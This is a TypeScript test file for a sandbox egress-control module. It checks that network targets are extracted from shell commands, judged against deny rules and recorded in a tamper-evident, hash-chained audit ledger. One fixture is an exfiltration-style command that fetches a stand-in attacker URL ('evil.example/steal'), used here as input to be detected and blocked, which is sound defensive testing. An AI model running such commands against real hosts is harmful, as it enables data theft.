// © 2026 IHUI AI (智汇AI) · 版权所有者: 李春川 (Li Chunchuan) · https://aizhs.top
// Provenance-watermarked. 未授权商用可被溯源追责 (Apache-2.0 须保留本声明与 NOTICE)。
// [IHUI-AI-PROVENANCE]:⁠​‌​​‌​​‌‍‍​‌​​‌​​​‍‍​‌​‌​‌​‌‍‍​‌​​‌​​‌‍‍​​‌​‌‌​‌‍‍​‌​​​​​‌‍‍​‌​​‌​​‌‍‍‌​‌‌​‌‌‌‍‍‌‌​​‌‌​​‌‌‌‌​‌​‍‍‌‌​‌‌​​​‌​​​‌‌‌‍‍​‌​​​​​‌‍‍​‌​​‌​​‌‍‍‌​‌‌​‌‌‌‍‍‌‌​​‌‌‌​‌​​‌‌‌​‍‍‌‌​​‌‌​​​‌​​‌​‌‍‍‌​‌‌‌​‌‌‌​‌‌‌​‌‍‍‌​‌‌​‌‌‌‍‍​‌​​‌‌​​‍‍​‌​​​​‌‌‍‍‌​‌‌​‌‌‌‍‍​‌‌​​​​‌‍‍​‌‌​‌​​‌‍‍​‌‌‌‌​‌​‍‍​‌‌​‌​​​‍‍​‌‌‌​​‌‌‍‍​​‌​‌‌‌​‍‍​‌‌‌​‌​​‍‍​‌‌​‌‌‌‌‍‍​‌‌‌​​​​‍‍‌​‌‌​‌‌‌‍‍​‌​‌​​​​‍‍​‌​‌​​‌​‍‍​‌​​‌‌‌‌‍‍​‌​‌​‌‌​‍‍​‌​​​‌​‌‍‍​‌​​‌‌‌​‍‍​‌​​​​​‌‍‍​‌​​‌‌‌​‍‍​‌​​​​‌‌‍‍​‌​​​‌​‌‍‍​​‌​‌‌​‌‍‍​​‌‌​​‌​‍‍​​‌‌​​​​‍‍​​‌‌​​‌​‍‍​​‌‌​‌‌​⁠

/**
 * F-076 / F-078 回归钉(缺陷普查收尾,两张出口管治工单)。
 *
 * F-076 — 取词缺口:
 *  ① 裸 `localhost` / `localhost:8080` 要进取词并走既有裁决;
 *  ② 解释器内嵌 URL(`node -e "fetch('http://evil')"`)在既有取词入口被扫出;
 *  ③ 能出网却一个目标都取不到(`curl -K cfg`)⇒ `target-missing` 的 unjudged,不静默 noop。
 *
 * F-078 — 台账不可篡改 / 写失败不放行:
 *  ④ 台账行带 `seq/prev/hash` 链,追加接链;篡改后追加被拒(unjudged);
 *  ⑤ enforce 档下台账写不成 / 链断 ⇒ blocked(advisory 档仍只出声,沿用既有档位语义);
 *  ⑥ 台账文件权限 0600(Windows 无 POSIX 权限语义,跳过该断言);
 *  ⑦ 旧格式台账(无链字段)作为迁移前缀,新行从其后接链。
 */

import { existsSync, mkdtempSync, readFileSync, rmSync, statSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';

import {
  appendEgressAuditRows,
  toAuditRow,
  type LedgerReadResult,
  type RowAppender,
} from '../src/sandbox/egress/audit-ledger.js';
import { bareHostOf } from '../src/sandbox/egress/bare-host.js';
import { adjudicateEgressTargets, extractEgressTargets } from '../src/sandbox/egress/dns-adjudicator.js';
import { buildEgressEnvExit, type EgressEnvExitInput } from '../src/sandbox/egress/env-inject.js';
import { EGRESS_ENV, type EgressJudgement, type EgressPolicy, type EgressRule } from '../src/sandbox/egress/policy.js';

const CHAIN_SEED = '0'.repeat(64);
const dirs: string[] = [];

function tempLedger(): string {
  const dir = mkdtempSync(join(tmpdir(), 'ihui-f076-078-'));
  dirs.push(dir);
  return join(dir, 'egress-decisions.jsonl');
}

afterEach(() => {
  for (const dir of dirs.splice(0)) rmSync(dir, { recursive: true, force: true });
});

function policyOf(rows: readonly EgressRule[], over: Partial<EgressPolicy> = {}): EgressPolicy {
  return { rules: rows, defaultDecision: 'allow', addressProof: false, enforcement: 'advisory', source: 'test', ...over };
}

const denyRow = (domain: string, enforcement: EgressRule['enforcement'] = 'enforce'): EgressRule => ({
  id: `test:deny:${domain}`,
  domain,
  effect: 'deny',
  enforcement,
  why: 'test rule',
});

const appendOk: RowAppender = () => null;
const readMissing: LedgerReadResult = { kind: 'missing' };

function exitOf(commandLine: string, over: Partial<EgressEnvExitInput> = {}) {
  return buildEgressEnvExit({
    commandLine,
    cwd: process.cwd(),
    env: {},
    append: appendOk,
    read: () => readMissing,
    ...over,
  });
}

describe('F-076 取词缺口', () => {
  it('① 裸 localhost / localhost:8080 取得出,交既有规则表裁决', () => {
    expect(bareHostOf('localhost')).toBe('localhost');
    expect(bareHostOf('localhost:8080')).toBe('localhost');
    expect(bareHostOf('LOCALHOST:3000')).toBe('localhost');
    // 形态校验仍拦普通单词与端口对(不因收 localhost 而放宽)
    expect(bareHostOf('main')).toBeNull();
    expect(bareHostOf('8080:80')).toBeNull();

    const rows = adjudicateEgressTargets('curl localhost:8080/admin', { policy: policyOf([denyRow('localhost')]) });
    expect(rows).toMatchObject([{ target: 'localhost', decision: 'deny', reason: 'rule-deny' }]);
    const exit = exitOf('curl localhost:8080/admin', { policy: policyOf([denyRow('localhost')]) });
    expect(exit.blocked).toBe(true);
    expect(exit.blockReason).toContain('localhost');
  });

  it('② 解释器内嵌 URL 在既有取词入口被扫出并裁决', () => {
    const targets = extractEgressTargets(`node -e "fetch('http://evil.example/steal')"`);
    expect(targets).toContainEqual({ raw: 'evil.example', origin: 'url' });

    const exit = exitOf(`node -e "fetch('http://evil.example/steal')"`, {
      policy: policyOf([denyRow('evil.example')]),
    });
    expect(exit.blocked).toBe(true);
    expect(exit.blockReason).toContain('evil.example');
  });

  it('③ 能出网却取不到目标(curl -K cfg)⇒ unjudged,enforce 档阻断,不再是 noop', () => {
    const exit = exitOf('curl -K cfg', { policy: policyOf([], { enforcement: 'enforce' }) });
    expect(exit.aggregate).toBe('unjudged');
    expect(exit.verdicts).toMatchObject([
      { target: '<no-target>', decision: 'unjudged', reason: 'target-missing', enforcement: 'enforce' },
    ]);
    expect(exit.blocked).toBe(true);
    expect(exit.warnings.join('\n')).toContain('egress unjudged');

    // 正向对照:没有网络效应的命令仍保持零裁决(不制造噪声)
    const quiet = exitOf('git checkout main', { policy: policyOf([], { enforcement: 'enforce' }) });
    expect(quiet.verdicts).toHaveLength(0);
    expect(quiet.blocked).toBe(false);
  });
});

function allowRow(): EgressJudgement {
  return {
    target: 'ok.example',
    decision: 'allow',
    layer: 'default',
    ruleId: null,
    reason: 'default-allow',
    hint: null,
    enforcement: 'advisory',
  };
}

function lineRow(ts: string) {
  return toAuditRow(allowRow(), () => new Date(ts), 4242, false);
}

describe('F-078 台账哈希链与放行耦合', () => {
  it('④ 追加接链:seq 连续、prev 指向前一行 hash', () => {
    const ledgerPath = tempLedger();
    const opts = { startDir: process.cwd(), env: { [EGRESS_ENV.ledger]: ledgerPath } };
    const first = appendEgressAuditRows([lineRow('2026-11-12T00:00:00.000Z')], opts);
    const second = appendEgressAuditRows([lineRow('2026-11-12T00:00:01.000Z')], opts);
    expect(first.state).toBe('written');
    expect(second.state).toBe('written');

    const lines = readFileSync(ledgerPath, 'utf8').trim().split('\n').map((line) => JSON.parse(line) as Record<string, unknown>);
    expect(lines).toHaveLength(2);
    expect(lines[0]).toMatchObject({ seq: 1, prev: CHAIN_SEED });
    expect(lines[1]).toMatchObject({ seq: 2, prev: lines[0]!.hash });
    for (const line of lines) expect(line.hash).toMatch(/^[0-9a-f]{64}$/);
  });

  it('④b 篡改既有行 ⇒ 后续追加被拒(链断),且 enforce 档下影响放行结论', () => {
    const ledgerPath = tempLedger();
    const env = { [EGRESS_ENV.ledger]: ledgerPath };
    appendEgressAuditRows([lineRow('2026-11-12T00:00:00.000Z')], { startDir: process.cwd(), env });
    const tampered = readFileSync(ledgerPath, 'utf8').replace('"decision":"allow"', '"decision":"deny"');
    writeFileSync(ledgerPath, tampered, 'utf8');

    const rejected = appendEgressAuditRows([lineRow('2026-11-12T00:00:02.000Z')], { startDir: process.cwd(), env });
    expect(rejected.state).toBe('unjudged');
    if (rejected.state === 'unjudged') expect(rejected.reason).toContain('ledger-chain-broken');

    const blocked = buildEgressEnvExit({
      commandLine: 'curl https://ok.example/x',
      cwd: process.cwd(),
      env,
      policy: policyOf([], { enforcement: 'enforce' }),
    });
    expect(blocked.blocked).toBe(true);
    expect(blocked.blockReason).toContain('egress_ledger_unjudged');
  });

  it('⑤ 写失败在 enforce 档阻断,advisory 档只出声(沿用既有档位语义)', () => {
    const ledgerPath = tempLedger();
    const env = { [EGRESS_ENV.ledger]: ledgerPath };
    const failing = () =>
      buildEgressEnvExit({
        commandLine: 'curl https://ok.example/x',
        cwd: process.cwd(),
        env,
        policy: policyOf([], { enforcement: 'enforce' }),
        append: () => 'EPERM',
        read: () => readMissing,
      });
    const blocked = failing();
    expect(blocked.ledger).toMatchObject({ state: 'unjudged' });
    expect(blocked.blocked).toBe(true);
    expect(blocked.blockReason).toContain('egress_ledger_unjudged: ledger-write-failed');

    const advisory = buildEgressEnvExit({
      commandLine: 'curl https://ok.example/x',
      cwd: process.cwd(),
      env,
      policy: policyOf([]),
      append: () => 'EPERM',
      read: () => readMissing,
    });
    expect(advisory.blocked).toBe(false);
    expect(advisory.warnings.join('\n')).toContain('egress ledger unjudged');
  });

  it('⑥ 台账文件权限 0600(Windows 无 POSIX 权限语义,跳过)', () => {
    const ledgerPath = tempLedger();
    const outcome = appendEgressAuditRows([lineRow('2026-11-12T00:00:00.000Z')], {
      startDir: process.cwd(),
      env: { [EGRESS_ENV.ledger]: ledgerPath },
    });
    expect(outcome.state).toBe('written');
    expect(existsSync(ledgerPath)).toBe(true);
    if (process.platform !== 'win32') expect(statSync(ledgerPath).mode & 0o777).toBe(0o600);
  });

  it('⑦ 旧格式台账只作迁移前缀,新行从其后接链', () => {
    const ledgerPath = tempLedger();
    const legacy = JSON.stringify({
      ts: '2026-11-01T00:00:00.000Z',
      pid: 1,
      target: 'old.example',
      decision: 'allow',
      layer: 'default',
      ruleId: null,
      reason: 'default-allow',
      enforcement: 'advisory',
      enforced: false,
    });
    writeFileSync(ledgerPath, legacy + '\n', 'utf8');

    const outcome = appendEgressAuditRows([lineRow('2026-11-12T00:00:00.000Z')], {
      startDir: process.cwd(),
      env: { [EGRESS_ENV.ledger]: ledgerPath },
    });
    expect(outcome.state).toBe('written');
    const lines = readFileSync(ledgerPath, 'utf8').trim().split('\n');
    expect(lines).toHaveLength(2);
    const appended = JSON.parse(lines[1]!) as Record<string, unknown>;
    expect(appended).toMatchObject({ seq: 2, prev: CHAIN_SEED });
  });
});
// ⁠​‌​​‌​​‌‍‍​‌​​‌​​​‍‍​‌​‌​‌​‌‍‍​‌​​‌​​‌‍‍​​‌​‌‌​‌‍‍​‌​​​​​‌‍‍​‌​​‌​​‌‍‍‌​‌‌​‌‌‌‍‍‌‌​​‌‌​​‌‌‌‌​‌​‍‍‌‌​‌‌​​​‌​​​‌‌‌‍‍​‌​​​​​‌‍‍​‌​​‌​​‌‍‍‌​‌‌​‌‌‌‍‍‌‌​​‌‌‌​‌​​‌‌‌​‍‍‌‌​​‌‌​​​‌​​‌​‌‍‍‌​‌‌‌​‌‌‌​‌‌‌​‌‍‍‌​‌‌​‌‌‌‍‍​‌​​‌‌​​‍‍​‌​​​​‌‌‍‍‌​‌‌​‌‌‌‍‍​‌‌​​​​‌‍‍​‌‌​‌​​‌‍‍​‌‌‌‌​‌​‍‍​‌‌​‌​​​‍‍​‌‌‌​​‌‌‍‍​​‌​‌‌‌​‍‍​‌‌‌​‌​​‍‍​‌‌​‌‌‌‌‍‍​‌‌‌​​​​‍‍‌​‌‌​‌‌‌‍‍​‌​‌​​​​‍‍​‌​‌​​‌​‍‍​‌​​‌‌‌‌‍‍​‌​‌​‌‌​‍‍​‌​​​‌​‌‍‍​‌​​‌‌‌​‍‍​‌​​​​​‌‍‍​‌​​‌‌‌​‍‍​‌​​​​‌‌‍‍​‌​​​‌​‌‍‍​​‌​‌‌​‌‍‍​​‌‌​​‌​‍‍​​‌‌​​​​‍‍​​‌‌​​‌​‍‍​​‌‌​‌‌​⁠
